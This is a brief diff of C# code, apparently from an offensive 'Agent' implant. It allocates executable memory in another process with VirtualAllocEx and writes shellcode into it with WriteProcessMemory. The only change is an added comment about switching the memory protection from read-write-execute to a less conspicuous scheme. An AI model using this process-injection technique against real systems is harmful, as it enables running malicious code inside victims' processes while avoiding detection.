@@ -70,6 +70,7 @@ namespace Agent
             IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
             // Write shellcode within process
+            // Need to update this to be ReadWrite and then ReadExecute
             UIntPtr bytesWritten;
             bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
 
